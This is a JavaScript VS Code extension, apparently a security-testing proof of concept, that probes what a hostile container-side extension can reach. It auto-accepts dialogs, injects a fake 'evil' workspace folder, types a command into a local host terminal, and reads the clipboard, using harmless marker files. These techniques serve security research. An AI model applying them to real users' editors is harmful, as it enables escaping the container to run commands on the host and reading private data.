// Attacker spike: a WORKSPACE (container) extension, not the bridge. It probes what a
// hostile container-side extension can reach through VS Code itself. Non-destructive:
// markers only, no secret use, no deletes outside its own /tmp markers.
const vscode = require("vscode");
const net = require("net");

const SOCK = "/tmp/expo-bridge-attacker.sock";
const MARK = `expo-spike-${Date.now()}`;

// Task 6: can a non-bridge extension invoke the ui-side bridge commands, and does the
// handler learn who called it? We call and report what comes back; the bridge handler
// itself records whether it saw any caller identity (it receives only its args).
async function callBridge(action, args = {}) {
  try {
    const r = await vscode.commands.executeCommand(`expoBridgeSpike.ui.${action}`, args);
    return { reached: true, result: r };
  } catch (e) {
    return { reached: true, threw: String(e?.message ?? e) };
  }
}

// Task 6: try to answer a modal the host extension shows, by firing the workbench
// commands that accept/dismiss dialogs and notifications. Non-destructive: we only
// send the accept/close commands; nothing is granted unless VS Code routes them.
async function pokeModals() {
  const cmds = [
    "notifications.showList",
    "notification.acceptPrimaryAction",
    "workbench.action.acceptSelectedQuickOpenItem",
    "workbench.action.closeQuickOpen",
    "notifications.clearAll",
  ];
  const out = {};
  for (const c of cmds) {
    try { await vscode.commands.executeCommand(c); out[c] = "sent"; }
    catch (e) { out[c] = `threw: ${String(e?.message ?? e)}`; }
  }
  return out;
}

// Task 6: swap workspace folders, then ask the bridge to resolve the host path — does it
// still see the original window's host path, or the one we injected?
async function swapFolders() {
  const before = (vscode.workspace.workspaceFolders ?? []).map((f) => f.uri.toString());
  let added = false;
  try {
    added = vscode.workspace.updateWorkspaceFolders(
      (vscode.workspace.workspaceFolders?.length ?? 0), 0,
      { uri: vscode.Uri.parse("vscode-remote://attacker+deadbeef/evil"), name: "evil" },
    );
  } catch (e) { return { before, updateThrew: String(e?.message ?? e) }; }
  const resolved = await callBridge("hostInfo", {});
  return { before, added, resolvedRoot: resolved.result?.root, resolvedAuthority: resolved.result?.authority };
}

// Task 7: open a LOCAL terminal and type a benign marker command into it. The command
// writes a marker file under the Mac's /tmp — proof of execution, nothing destructive.
async function localTerminalExec() {
  try {
    await vscode.commands.executeCommand("workbench.action.terminal.newLocal");
    const payload = `printf '%s' ${MARK} > /tmp/${MARK}.localterm ; : done\r`;
    const r = await vscode.commands.executeCommand("workbench.action.terminal.sendSequence", { text: payload });
    return { sent: true, marker: `/tmp/${MARK}.localterm (on the Mac)`, sendResult: r ?? null };
  } catch (e) { return { sent: false, threw: String(e?.message ?? e) }; }
}

// Task 7: open a file: URI and a URL on the Mac, and read/write the Mac clipboard.
async function openAndClipboard() {
  const out = {};
  try { await vscode.commands.executeCommand("vscode.open", vscode.Uri.file(`/tmp/${MARK}.open`)); out.vscodeOpen = "sent"; }
  catch (e) { out.vscodeOpen = `threw: ${String(e?.message ?? e)}`; }
  try { out.openExternal = await vscode.env.openExternal(vscode.Uri.parse(`https://example.com/?${MARK}`)); }
  catch (e) { out.openExternal = `threw: ${String(e?.message ?? e)}`; }
  try {
    const prev = await vscode.env.clipboard.readText();
    await vscode.env.clipboard.writeText(MARK);
    const now = await vscode.env.clipboard.readText();
    out.clipboard = { readable: typeof prev === "string", wroteMarker: now === MARK };
    await vscode.env.clipboard.writeText(prev); // restore — non-destructive
  } catch (e) { out.clipboard = `threw: ${String(e?.message ?? e)}`; }
  return out;
}

// Task 6: can we read the ui side's SecretStorage / globalState? A workspace extension
// has only its OWN storage; we report that we cannot name another extension's.
function storageReach(ctx) {
  return {
    ownGlobalStateKeys: ctx.globalState.keys(),
    note: "a workspace extension has no handle to another extension's SecretStorage or globalState",
  };
}

async function runAll(ctx) {
  return {
    marker: MARK,
    remoteName: vscode.env.remoteName,
    task6_callBridgeStatus: await callBridge("hostInfo", {}),
    task6_pokeModals: await pokeModals(),
    task6_swapFolders: await swapFolders(),
    task6_storage: storageReach(ctx),
    task7_localTerminal: await localTerminalExec(),
    task7_openAndClipboard: await openAndClipboard(),
    task7_confirmMacMarker: await callBridge("readMacTmp", { name: `${MARK}.localterm` }),
  };
}

exports.activate = (ctx) => {
  ctx.subscriptions.push(
    vscode.commands.registerCommand("expoBridgeSpike.attacker.run", () => runAll(ctx)),
  );
  const fs = require("fs");
  try { fs.unlinkSync(SOCK); } catch (e) { if (e.code !== "ENOENT") throw e; }
  const server = net.createServer((conn) => {
    runAll(ctx).then(
      (r) => conn.end(JSON.stringify({ ok: true, result: r }) + "\n"),
      (e) => conn.end(JSON.stringify({ ok: false, error: String(e?.message ?? e) }) + "\n"),
    );
  });
  server.listen(SOCK);
  ctx.subscriptions.push({ dispose: () => server.close() });
};
exports.deactivate = () => {};
